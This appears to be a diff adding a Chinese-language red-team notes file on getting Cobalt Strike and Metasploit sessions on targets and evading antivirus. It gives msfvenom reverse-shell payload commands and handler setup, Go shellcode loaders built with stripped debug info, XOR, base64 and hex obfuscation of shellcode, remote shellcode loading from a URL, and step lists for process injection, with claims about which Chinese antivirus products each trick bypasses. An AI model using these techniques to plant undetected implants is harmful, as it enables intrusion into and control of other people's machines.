@@ -1,0 +1,299 @@
+
+CS/MSF上线：
+一般需要将普通的webshell通过exe木马或其他等方式转为msf/cs的shell。msf/cs通过exe、elf木马上线得到的权限一般更高。
+注：windows一般采用exe文件上线，linux一般采用elf文件上线。
+最好cs、msf结合使用。
+
+
+
+vps部署：自动部署。
+
+
+cs->msf联动方式二：cs流量->msf的socks代理->目标。
+1.cs配置socks代理。 pivoting->socks server. 如设置端口：62920
+2.cs服务端检测端口是否正常开启：netstat -anto | grep "62920"
+3.cs生成设置socks的指令，view->Proxy Pivots->socks->tunnel
+4.msf配置socks联动：setg ReverseAllowProxy true即允许反向代理。
+
+
+
+
+
+
+
+利用cs直接生成exe文件，却被安全设备杀掉。故需对payload进行二次改造。
+
+360安全卫士本质是静态查杀。
+火绒有沙箱，故具有行为查杀功能。
+AV引擎分析方法：
+1.静态分析：基于特征库匹配查杀(主要是查PE头)。
+绕过：
+加壳、改壳、替换、添加资源、加密shellcode、混淆shellcode、修改特征等。
+2.云查杀。
+3.动态查杀：进程内存/运行时分析。
+分析的是正在运行的进程的内存数据。主要是监控进程对windows api的调用。 内存中很难将代码混淆。
+注：常用c、c++、go做免杀。
+编译型语言：c、c++、go
+c、c++优点：木马体积小;代码更容易免杀;能跨环境。
+c、c++不足：开发难度大。
+
+golang优点：打包部署跨环境;相比python生成木马体积更小;难度低。
+golang不足：开发稍难。
+
+解释型语言：python
+python优点：难度低。
+python不足：木马体积大;打包困难、难以跨环境。  常用打包工具：pyinstaller、py2exe.
+
+
+结合使用、灵活使用、取长补短。
+
+
+
+
+静态免杀：
+1.分离shellcode免杀(推荐、分shellcode加载器和shellcode)，如：
+shellcode在vps上，通过shellcode加载器远程加载。  或加载到图片中(如golang).
+(1)本地加载：加密、增加随机字符混淆、加壳改壳.
+(2)远程加载。
+2.内嵌shellcode(即shellcode直接写死在程序中)：加密、增加随机字符混淆.
+
+
+常见名词：
+kernel32.dll：windows中的32位动态链接库文件。工作在ringo，属于内核级文件。控制着系统的内存管理、数据的输入输出操作和中断处理。当win启动时，该文件就驻留在内存中特定的写保护区域，使别的程序无法占用该区域，提供了954个可供调用的api.
+GetProcAddress：是一个计算机函数。功能是检索指定的动态链接库(dll)中的输出库函数地址，若函数查找成功，则返回dll中的输出函数地址;若函数调用失败，则返回NULL.
+动态链接库(dll)的进程会调用GetProcAddress来获取dll中导出函数的地址。
+
+LoadLibrary：将指定的模块加载到调用进程的地址空间中。若函数成功，则返回值为模块的句柄;若函数失败，则返回NULL.
+
+
+加载shellcode原理：大多为调用windows底层api来完成加载shellcode.
+
+加载shellcode的方法：
+1.从资源合伙数据段中获取：
+(1)申请内存：一般使用VirtualAlloc、HeapCreate、GlobalAlloc.
+(2)加载shellcode到内存中：
+a1：从资源(一般使用FindResource、LoadResource、LockResource)下载到内存加载。
+a2：将加密后的shellcode存入数据段，恶意代码运行时，先将数据段中的shellcode解密到内存中。
+(3)执行内存中的shellcode.
+2.宏代码：
+(1)宏代码中硬编码加密后的shellcode
+(2)宏代码运行后，会先申请内存。
+(3)使用WriteProcessMemory将解密的shellcode写入申请的内存中。
+(4)CreateThread创建线程执行：
+a1：为当前进程分配内存。
+a2：将shellcode拷贝到分配的内存中。
+a3：修改新分配的内存的保护机制，以允许shellcode在该内存中运行。
+a4：使用已分配内存段的基地址创建线程。
+a5：等待返回线程句柄。
+
+
+
+3.注入：
+(1)获取进程句柄。
+(2)申请内存。
+(3)将shellcode写入或映射到申请的内存中。
+(4)执行内存中的shellcode。
+
+
+4.执行内存中的shellcode方法：
+(1)CreateRemoteThread工作流程。
+a1：获取目标注入进程的进程id.
+a2：打开目标进程.
+a3：在目标内存中分配可执行内存.
+a4：将shellcode写入到已分配内存中.
+a5：使用已分配内存段的起始地址在远程进程中创建一个线程.
+
+(2)QueueUserAPC工作流程。
+a1：获取目标注入进程的进程id.
+a2：打开目标进程.
+a3：在目标内存中分配可执行内存.
+a4：将shellcode写入到已分配内存中.
+a5：修改新分配内存的保护机制，以允许shellcode在该内存中运行.
+a6：使用已分配内存段的起始地址在远程进程中创建一个线程.
+a7：当线程进入"预警"状态时，将线程提交至执行队列.
+a8：将线程恢复至"预警"状态.
+
+
+
+静态免杀：
+ONE：分离免杀：
+一：免杀手法1：常见加密/编码混淆方式：xor加密、AES、RSA、16进制编码、base64编码等.
+异或(xor)两次操作为原型，异或不会产生坏字符.
+eg1：go版本本地加载：
+1.编译程序，去掉调试信息，如：
+go build -ldflags "-s -w" main.go
+其中-ldflags "-s -w"表示隐藏错误和调式信息，不推荐，容易被火绒杀。
+"-H windowsgui" 隐藏窗口执行，不推荐，容易被火绒杀。不要在中文路径下生成，容易被火绒杀。
+eg1：
+go build -ldflags "-s -w -H windowsgui"  base64Main.go
+一样会被火绒杀。
+
+
+
+
+2.去掉调试等信息，避免被查杀和溯源，linux下命令：
+./go-strip -f main.exe -a -output newz.exe
+
+能直接从go编译好的二进制中消除调试等信息：
+https://github.com/boy-hack/go-strip
+
+3. cs生成对应shellcode.
+选择listener->一般为C语言->选择对应架构->生成payloazd.c文件。
+将其中的real shellcode(如x50\x25\x00\x55)保存到q.txt中-->
+xwoqhz.exe payloazqd.txt生成xor.txt，其中为异或后的shellcode.
+
+上传nwe.exe和selczd.txt
+若上传失败，则可尝试新建如inc文件夹，上传到此目录。
+
+
+nwz.exe selcodwdqz.txt
+上线成功。
+最好不要将cs的休眠时间改为0.
+
+总结eg1：
+1.使用go编写2个文件：loaderz.go和shellcodez.go
+loaderz.go：主要是加载dll、分配内存、打开shellcode文件、调用.
+shellcodez.go：对字符做异或处理。如：cs生成C的payloadz.c文件，将其中的real shellcode(如x50\x25\x00\x55...)保存到q.txt中，对q.txt中的二进制数据进行异或处理，生成新的z.txt(里面数据为异或后的shellcode)文件。
+
+2.编译：
+编译程序，去掉调试信息，如：
+go build -ldflags "-s -w" loaderz.go 		//生成loaderz.exe文件(理解为shellcode加载器)
+go build -ldflags "-s -w" shellcodez.go 	//生成shellcodez.exe文件
+
+
+能直接从go编译好的二进制中消除调试等信息：
+https://github.com/boy-hack/go-strip
+
+去掉调试等信息，避免被查杀和溯源，linux下命令：
+./go-strip -f loaderz.exe -a -output loaderw.exe
+
+3.对原始shellcode进行处理，生成处理后的(免杀)shellcode：
+shellcodez.exe q.txt
+
+4.上传加载器(loaderz.exe)和shellcode文件(z.txt)到目标机器。
+5.运行，上线：
+loaderz.exe z.txt
+
+cs成功获得会话。
+
+
+
+eg1：go版本远程加载：
+如：loadewr.exe http://www.asdwqz.com/shellcodze.txt
+
+二：内嵌shellcode(即shellcode直接写死在程序中)：
+加密、增加随机字符混淆：
+方式1：加密或编码：如异或：
+msf：
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/reverse_tcp_rc4 	//流量加密
+set lhost 192.168.43.141
+set lport 4431
+run -j 	//后台运行
+
+生成msf的shellcode：
+msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.43.141 lport=4431 -f c -o sbxz.txt
+需进行处理：得到real shellcode(python脚本、替换都行)：
+yhuwo.exe shellcodwe.txt生成异或后的shellcode文件：msfshellcodze.txt
+
+若上传exe文件失败，则可尝试上传txt，再更改即可，如：
+copy qwz.txt qwz.exe
+
+运行：
+loadwz.exe  msfshellcodze.txt
+
+msf成功获取session.
+
+
+
+TWO：内嵌shellcode(即shellcode直接写死在程序中)：加密、增加随机字符混淆.
+异或免杀：
+cs/msf的shellcode可行。
+
+vs：
+文件->新建项目->控制台应用->项目->ConsoleApplication1属性页->C/C++->代码生成->运行库选择：
+多线程(/MT)[即若选上此选项，则会自动将依赖文件等一起打包]->上方一般选择Release(即可运行或上线版本)->选择对应的架构->删除右边源文件下的所有文件，添加自己的c文件到源文件下(也可编辑)->生成->重新生成解决方案->右边打开对应的文件目录->生成ConsoleApplication1.exe成功。
+
+cmd运行即可。
+上线成功(cs、msf都行)。
+
+cs的shellcode异或不能过360杀毒，故我要再变换shellcode。  base64可以绕过360杀毒。
+
+
+将shellcode转为16进制(hex)：
+eg1：
+strw=b"\x64\x22\x61\x25\x64\x25\x77\x5c" 	//原始 为bytes类型
+strp=strw.hex() 结果为：'642261256425775c' 	//为str类型
+strpz=strw.hex().encode() 结果为：b'642261256425775c' 	//为bytes类型，即16进制类型。
+
+
+
+base64且去掉调试信息能过安全狗、D盾、360杀毒、火绒、腾讯管家、河马查杀。
+hex编码(即去掉\x等)一样能过安全狗、D盾、360杀毒、火绒、腾讯管家、河马查杀。
+免杀手法跟前面的都差不多，编码、混淆、转换、加密解密等。 只是语言环境不同而已。
+
+方式三：
+将shellcode注入到进程中。
+
+方式四：远程加载一般都会被杀。
+远程加载shellcode文本方式。 最好先对url进行hex编码再解码。
+就是一个go的http请求。
+
+
+方式五：将shellcode以参数的方式执行(省略了读取文件的动作)，如：
+loaderz.exe fkwdzqlwdllzwz
+
+key什么的关键参数也可以通过参数的方式传递，如：
+loaderz.exe fkwdzqlwdllzwz passwdz key1 key6qz
+
+
+msf上线：
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp_uuid 	//uuid也是加密传输
+set lhost 192.168.43.141 	//0.0.0.0也行
+set lport 3569
+
+生成对应的shellcode：
+msfvenom -p windows/x64/meterpreter/reverse_tcp_uuid lhost=192.168.43.141 lport=3569 -f c -o sbwz.txt
+
+若在linux下打包在win下使用的文件，则：
+CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" hexMwzain.go 
+
+
+去掉调试等信息：
+./go-strip -f hexMwzain.exe -a -output qwdz.exe
+
+上传、运行，msf上线成功。
+
+
+若x64的shellcode不行就尝试x86的shellcode.
+
+
+
+sed ':a;N;$!ba;s/\n/-/g' file
+在循环中读取整个文件，再用-替换换行符。
+
+:a;N;$!ba;
+到了最后一行不执行跳转,即把所有的行全读入pattern space中.
+eg1：
+:w;N;$!bw;
+
+sed ':a;  $!N;  s/\n/string/;'
+     ---  ----  -------------
+      |     |        |          
+      |     |        |-------------> 将换行符替换为空
+      |     |----------------------> 表示除最后一行外，其他每行读入时，都进行后面的规则匹配(将换行符替换为string 其实s/\n/string/g;也行)。
+      |----------------------------> 创建标签a
+
+
+
+grep -v strz 	//选出每行中不包含strz字符串的行
+如：
+grep -v sbxzzz 	//选出每行中不包含sbxzzz字符串的行
+sed "s/匹配的字符/新的替换字符/g"
+sed "s/\;//g"	//将;替换为空。其实没有\结果也是一样的。
+
+cs相对msf很明显的特征：会加载dll文件。
+免杀核心是思路。
+
+
